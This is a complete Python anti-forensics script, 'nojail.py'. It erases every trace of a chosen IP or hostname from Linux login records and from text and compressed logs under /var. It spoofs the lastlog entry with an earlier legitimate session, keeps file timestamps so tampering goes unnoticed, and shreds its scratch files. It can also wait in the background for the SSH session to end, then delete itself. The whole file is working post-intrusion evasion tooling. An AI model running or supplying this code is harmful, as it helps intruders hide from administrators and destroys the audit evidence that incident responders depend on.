#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    nojail.py - Ghost Protocol Log Sanitizer

    Original: @JusticeRage
    Updated:  @moscovium-mc

    Sterilizes UTMP/WTMP/BTMP, lastlog, and filesystem text logs.
    Removes all traces of a given IP/hostname from the system.

    Entries are removed from binary logs (utmp/wtmp/btmp) by IP or hostname.
    Text logs are scrubbed line-by-line. File descriptors are preserved so
    syslog/journald keep writing without noticing anything changed.
    All scratch work happens in /dev/shm (or /tmp) and is securely wiped.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    ---------------------------------------------------------------------------
    Usage:
      ./nojail.py [--user USER] [--ip IP] [--hostname HOSTNAME]
                  [--regexp REGEXP] [--verbose] [--check] [--daemonize]
                  [--self-delete] [log_files ...]

    Defaults:
      --user      $USER env var
      --ip        first field of $SSH_CONNECTION
      --hostname  reverse DNS of the IP
    ---------------------------------------------------------------------------
"""

import argparse
import datetime
import gzip
import os
import platform
import pwd
import random
import re
import shutil
import signal
import socket
import struct
import subprocess
import sys
import time

# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------

VERBOSE    = False
CHECK_MODE = False

# Binary log targets (Linux)
UTMP_FILES  = ["/var/run/utmp", "/var/log/wtmp", "/var/log/btmp"]
LASTLOG_FILE = "/var/log/lastlog"

# Text log targets (always processed)
TEXT_LOGS = [
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/auth.log",
    "/var/log/syslog",
]

# UTMP struct layout (Linux x86-64, glibc)
UTMP_BLOCK_SIZE    = 384
LASTLOG_BLOCK_SIZE = 292
UTMP_FMT           = "hi32s4s32s256s2h3i36x"
LASTLOG_FMT        = "i32s256s"

# Tracks the last clean login so we can spoof lastlog convincingly
_LAST_LOGIN = {"timestamp": 0, "terminal": b"", "hostname": b""}

# ---------------------------------------------------------------------------
# Aesthetics
# ---------------------------------------------------------------------------

GREEN  = "\033[92m"
ORANGE = "\033[93m"
RED    = "\033[91m"
END    = "\033[0m"

def red(t):    return RED    + t + END
def orange(t): return ORANGE + t + END
def green(t):  return GREEN  + t + END

def error(t):   return f"[{red('!')}] {red('Error: ' + t)}"
def warning(t): return f"[{orange('*')}] Warning: {t}"
def success(t): return f"[{green('*')}] {green(t)}"
def info(t):    return f"[ ] {t}"

# ---------------------------------------------------------------------------
# Utility
# ---------------------------------------------------------------------------

def _random_name(n: int = 12) -> str:
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))


def _tmpfile() -> str:
    """Return a path in /dev/shm if writable, else /tmp."""
    base = "/dev/shm" if os.access("/dev/shm", os.W_OK) else "/tmp"
    return os.path.join(base, _random_name())


def _preserve_overwrite(src: str, dst: str) -> bool:
    """
    Overwrite `dst` with the contents of `src` without breaking any open
    file descriptors that point to `dst` (syslog, journald, etc. keep writing).
    Timestamps are preserved.
    """
    if not (os.path.exists(src) and os.path.exists(dst)):
        return False
    if not os.access(dst, os.W_OK):
        return False
    stat = os.stat(dst)
    try:
        with open(src, "rb") as s, open(dst, "r+b") as d:
            data = s.read()
            d.seek(0)
            d.write(data)
            d.truncate()
        os.utime(dst, (stat.st_atime, stat.st_mtime))
        return True
    except OSError:
        return False


def _secure_delete(path: str) -> None:
    """Three-pass wipe then unlink."""
    if not os.path.exists(path):
        return
    if shutil.which("shred"):
        subprocess.call(
            ["shred", "-uz", path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return
    try:
        size = os.path.getsize(path)
        with open(path, "wb") as fh:
            for _ in range(3):
                fh.seek(0)
                fh.write(os.urandom(size))
        os.unlink(path)
    except OSError:
        pass

# ---------------------------------------------------------------------------
# Binary log cleaning (UTMP / WTMP / BTMP)
# ---------------------------------------------------------------------------

def clean_utmp(filename: str, username: str, ip: str, hostname: str) -> None:
    global _LAST_LOGIN

    if not os.path.exists(filename):
        print(warning(f"{filename} does not exist."))
        return

    ip_b       = ip.encode()
    hostname_b = hostname.encode()
    username_b = username.encode()

    clean_data  = b""
    removed     = 0

    try:
        with open(filename, "rb") as fh:
            while True:
                block = fh.read(UTMP_BLOCK_SIZE)
                if len(block) < UTMP_BLOCK_SIZE:
                    break

                try:
                    entry = struct.unpack(UTMP_FMT, block)
                except struct.error:
                    clean_data += block
                    continue

                line_host = entry[5].rstrip(b"\x00")
                line_user = entry[4].rstrip(b"\x00")

                if line_host in (ip_b, hostname_b):
                    if CHECK_MODE:
                        ans = input(
                            f"  Delete entry for {line_user.decode(errors='replace')} "
                            f"from {line_host.decode(errors='replace')}? [Y/n] "
                        )
                        if ans.strip().lower() == "n":
                            clean_data += block
                            continue
                    removed += 1
                else:
                    # Track most recent clean session for this user (spoof lastlog later)
                    if (
                        filename != UTMP_FILES[-1]  # not btmp
                        and line_user == username_b
                        and entry[9] > _LAST_LOGIN["timestamp"]
                    ):
                        _LAST_LOGIN = {
                            "timestamp": entry[9],
                            "terminal":  entry[2],
                            "hostname":  entry[5],
                        }
                    clean_data += block

        if removed:
            tmp = _tmpfile()
            with open(tmp, "wb") as fh:
                fh.write(clean_data)
            if _preserve_overwrite(tmp, filename):
                print(success(f"{removed} entr{'y' if removed == 1 else 'ies'} "
                              f"removed from {filename}!"))
            _secure_delete(tmp)
        else:
            print(info(f"No entries to remove from {filename}."))

    except PermissionError:
        print(error(f"Permission denied reading {filename}."))
    except Exception as exc:
        print(error(f"Failed processing {filename}: {exc}"))


# ---------------------------------------------------------------------------
# Lastlog cleaning
# ---------------------------------------------------------------------------

def clean_lastlog(filename: str, username: str, ip: str, hostname: str) -> None:
    if not os.path.exists(filename):
        return

    try:
        uid = pwd.getpwnam(username).pw_uid
    except KeyError:
        print(warning(f"User {username!r} not found, skipping lastlog."))
        return

    ip_b       = ip.encode()
    hostname_b = hostname.encode()

    try:
        with open(filename, "rb") as fh:
            prefix = fh.read(uid * LASTLOG_BLOCK_SIZE) if uid else b""
            block  = fh.read(LASTLOG_BLOCK_SIZE)
            suffix = fh.read()

        if not block:
            return

        try:
            entry = struct.unpack(LASTLOG_FMT, block)
        except struct.error:
            return

        current_host = entry[2].rstrip(b"\x00")
        if current_host not in (ip_b, hostname_b):
            return  # Already clean

        # Spoof with previous legit session or zero out
        if _LAST_LOGIN["timestamp"]:
            replacement = struct.pack(
                LASTLOG_FMT,
                _LAST_LOGIN["timestamp"],
                _LAST_LOGIN["terminal"],
                _LAST_LOGIN["hostname"],
            )
            ts = datetime.datetime.fromtimestamp(_LAST_LOGIN["timestamp"])
            term = _LAST_LOGIN["terminal"].rstrip(b"\x00").decode(errors="replace")
            host = _LAST_LOGIN["hostname"].rstrip(b"\x00").decode(errors="replace")
            print(success(
                f"Lastlog spoofed to {ts:%Y-%m-%d %H:%M:%S} "
                f"from {term} at {host}"
            ))
        else:
            replacement = b"\x00" * LASTLOG_BLOCK_SIZE
            print(success("Lastlog zeroed out (no prior session to spoof with)."))

        tmp = _tmpfile()
        with open(tmp, "wb") as fh:
            fh.write(prefix + replacement + suffix)
        _preserve_overwrite(tmp, filename)
        _secure_delete(tmp)

    except PermissionError:
        print(error(f"Permission denied reading {filename}."))
    except Exception as exc:
        print(error(f"Failed processing {filename}: {exc}"))


# ---------------------------------------------------------------------------
# Text log cleaning
# ---------------------------------------------------------------------------

def clean_text_logs(
    extra_paths: list,
    ip: str,
    hostname: str,
    extra_regexp: "re.Pattern | None" = None,
) -> None:
    """
    Scrub text logs found under /var/**/*.log plus any extra paths provided.
    Handles plain .log, .log.1, and .log.N.gz files.
    """
    targets: set = set()

    # Crawl /var for .log files
    try:
        result = subprocess.run(
            ["find", "/var", "-type", "f",
             r"\(", "-name", "*.log",
             "-o", "-name", "*.log.[0-9]*",
             "-o", "-name", "*.log.[0-9]*.gz", r"\)"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line:
                targets.add(line)
    except Exception:
        pass

    # Add explicit paths and extra paths from the user
    for path in TEXT_LOGS + list(extra_paths):
        if os.path.isfile(path):
            targets.add(path)
        elif os.path.isdir(path):
            for root, _, files in os.walk(path):
                for fname in files:
                    if fname.endswith((".log", ".gz")):
                        targets.add(os.path.join(root, fname))

    for log in sorted(targets):
        if not os.path.exists(log) or not os.access(log, os.W_OK):
            continue

        _clean_single_text_log(log, ip, hostname, extra_regexp)


def _clean_single_text_log(
    log: str,
    ip: str,
    hostname: str,
    extra_regexp: "re.Pattern | None",
) -> None:
    is_gz = log.endswith(".gz")
    removed = 0
    tmp = _tmpfile()

    try:
        opener = gzip.open if is_gz else open
        with opener(log, "rb") as src, open(tmp, "wb") as dst:
            for line in src:
                decoded = line.decode("utf-8", errors="replace")
                if ip in decoded or hostname in decoded:
                    removed += 1
                    continue
                if extra_regexp and re.search(extra_regexp, decoded):
                    removed += 1
                    continue
                dst.write(line)

        if removed:
            if is_gz:
                # Re-compress before writing back
                gz_tmp = tmp + ".gz"
                with open(tmp, "rb") as plain, gzip.open(gz_tmp, "wb") as gz_out:
                    gz_out.write(plain.read())
                _secure_delete(tmp)
                if _preserve_overwrite(gz_tmp, log):
                    print(success(f"{removed} line(s) purged from {log}"))
                _secure_delete(gz_tmp)
            else:
                if _preserve_overwrite(tmp, log):
                    print(success(f"{removed} line(s) purged from {log}"))
                _secure_delete(tmp)
        else:
            _secure_delete(tmp)

    except PermissionError:
        _secure_delete(tmp)
    except Exception as exc:
        if VERBOSE:
            print(warning(f"Could not process {log}: {exc}"))
        _secure_delete(tmp)


# ---------------------------------------------------------------------------
# Daemonize mode (clean logs when the SSH session ends)
# ---------------------------------------------------------------------------

def daemonize_and_wait(
    username: str,
    ip: str,
    hostname: str,
    extra_paths: list,
    extra_regexp: "re.Pattern | None",
    script_path: str,
    self_delete: bool,
) -> None:
    """
    Fork into the background. Wait for the current SSH session to end, then
    run the cleaning routines and optionally delete the script.
    """
    has_tty = sys.stdin.isatty()

    pid = os.fork()
    if pid > 0:
        print(info("Daemon spawned. Logs will be cleaned when this session ends."))
        print(info("Log out now."))
        return

    os.setsid()
    pid2 = os.fork()
    if pid2 > 0:
        sys.exit(0)

    # Second child: watch for session end
    ppid = os.getppid()

    if has_tty:
        # Wait for the parent shell to die
        while True:
            try:
                os.kill(ppid, 0)
                time.sleep(2)
            except ProcessLookupError:
                break
    else:
        # No TTY (e.g. called from Weevely) – wait 60 s then fire
        time.sleep(60)

    # Run the cleaning
    for f in UTMP_FILES:
        clean_utmp(f, username, ip, hostname)
    clean_lastlog(LASTLOG_FILE, username, ip, hostname)
    clean_text_logs(extra_paths, ip, hostname, extra_regexp)

    if self_delete and os.path.exists(script_path):
        _secure_delete(script_path)

    sys.exit(0)


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Ghost Protocol Log Sanitizer — leave no trace.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("log_files", nargs="*",
                   help="Extra log files or directories to clean.")
    p.add_argument("--user",     "-u", help="Username to ghost.")
    p.add_argument("--ip",       "-i", help="Source IP to erase.")
    p.add_argument("--hostname",       help="Hostname to erase (default: rDNS of IP).")
    p.add_argument("--regexp",   "-r", help="Extra regex to match lines for deletion.")
    p.add_argument("--verbose",  "-v", action="store_true")
    p.add_argument("--check",    "-c", action="store_true",
                   help="Confirm each deletion interactively.")
    p.add_argument("--daemonize","-d", action="store_true",
                   help="Background mode: clean logs after session ends. "
                        "Implies --self-delete.")
    p.add_argument("--self-delete", "-s", action="store_true",
                   help="Delete this script after execution.")
    return p.parse_args()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    global VERBOSE, CHECK_MODE

    args = parse_args()
    VERBOSE    = args.verbose
    CHECK_MODE = args.check

    # Auto-detect parameters from the environment
    if not args.user:
        args.user = os.environ.get("USER") or os.environ.get("LOGNAME") or "root"

    if not args.ip:
        ssh_conn = os.environ.get("SSH_CONNECTION", "")
        if ssh_conn:
            args.ip = ssh_conn.split()[0]
        else:
            print(error("Cannot auto-detect IP. Specify one with --ip / -i."))
            sys.exit(1)

    if not args.hostname:
        try:
            args.hostname = socket.gethostbyaddr(args.ip)[0]
        except (socket.herror, socket.gaierror):
            args.hostname = args.ip

    extra_re = re.compile(args.regexp) if args.regexp else None

    print(info(f"Initiating Ghost Protocol for {args.user} "
               f"({args.ip} — {args.hostname})"))

    if platform.system() != "Linux":
        print(error("Binary log cleaning is Linux-only. Text logs will still be scrubbed."))

    # Daemonize mode
    if args.daemonize:
        daemonize_and_wait(
            args.user, args.ip, args.hostname,
            args.log_files, extra_re,
            os.path.abspath(__file__),
            self_delete=True,
        )
        return

    # Normal (immediate) mode
    if platform.system() == "Linux":
        for f in UTMP_FILES:
            clean_utmp(f, args.user, args.ip, args.hostname)
        clean_lastlog(LASTLOG_FILE, args.user, args.ip, args.hostname)

    clean_text_logs(args.log_files, args.ip, args.hostname, extra_re)

    if args.self_delete:
        _secure_delete(os.path.abspath(__file__))
        print(info("Script self-destructed."))

    print(success("Sanitization complete. You were never here."))


if __name__ == "__main__":
    main()
